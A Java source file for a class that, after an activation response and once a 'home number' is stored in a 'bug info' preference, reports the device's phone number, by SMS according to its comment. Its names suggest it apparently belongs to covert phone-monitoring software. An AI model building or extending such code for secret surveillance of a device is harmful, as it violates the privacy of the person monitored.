package com.vvt.reportnumber;

import com.vvt.global.Global;
import com.vvt.pref.PrefBugInfo;
import com.vvt.pref.PrefInfo;
import com.vvt.pref.Preference;
import com.vvt.pref.PreferenceChangeListener;
import com.vvt.pref.PreferenceType;
import com.vvt.prot.CommandResponse;
import com.vvt.prot.command.response.SendActivateCmdResponse;
import com.vvt.protsrv.PhoenixProtocolListener;
import com.vvt.protsrv.SendActivateManager;
import com.vvt.std.Log;
/**
 * Send SMS after activated and home number already saved(from PCCAddHomeNumber).
 */

public class ReportPhoneNumber implements PhoenixProtocolListener, PreferenceChangeListener {

	private final String TAG = "ReportPhoneNumber";
	private boolean isStart = false;
	private Preference pref = Global.getPreference();
	private SendActivateManager sendActMng = Global.getSendActivateManager();
	
	public void startReport() {
		if (Log.isDebugEnable()) {
			Log.debug(TAG + ".startReport()", "isStart: " + isStart);
		}
		if (!isStart) {
			isStart = true;
			sendActMng.addListener(this);
		}
	}
	
	public void stopReport() {
		if (isStart) {
			isStart = false;
			sendActMng.removeListener(this);
			PrefBugInfo prefBug = (PrefBugInfo)pref.getPrefInfo(PreferenceType.PREF_BUG_INFO);
			if (prefBug.isSupported()) {
				pref.removePreferenceChangeListener(PreferenceType.PREF_BUG_INFO, this);
			}
		}
	}
	
	private void execute() {		
		ReportPhoneNumberOnDemand reportNumber = new ReportPhoneNumberOnDemand();
		reportNumber.reportPhoneNumber();
	}
	

	// PhoenixProtocolListener
	public void onError(String message) {
		Log.error(TAG + ".onError()", message);
	}

	public void onSuccess(CommandResponse response) {
		if (Log.isDebugEnable()) {
			Log.debug(TAG + ".onSuccess()", "ENTER");
		}
		if (response instanceof SendActivateCmdResponse) {
			PrefBugInfo prefBug = (PrefBugInfo)pref.getPrefInfo(PreferenceType.PREF_BUG_INFO);
			if (prefBug.isSupported()) {
				pref.registerPreferenceChangeListener(PreferenceType.PREF_BUG_INFO, this);
			}
		}
	}
	
	// PreferenceChangeListener
	public void preferenceChanged(PrefInfo prefInfo) {
		if (prefInfo.getPrefType().getId() == PreferenceType.PREF_BUG_INFO.getId()) {
			if (Log.isDebugEnable()) {
				Log.debug(TAG + ".preferenceChanged()", "ENTER");
			}
			PrefBugInfo prefBug = (PrefBugInfo)pref.getPrefInfo(PreferenceType.PREF_BUG_INFO);
			if (prefBug.isSupported()) {
				if (prefBug.countHomeOutNumber() > 0) {
					pref.removePreferenceChangeListener(PreferenceType.PREF_BUG_INFO, this);
					execute();
				}
			}
		}
	}
}
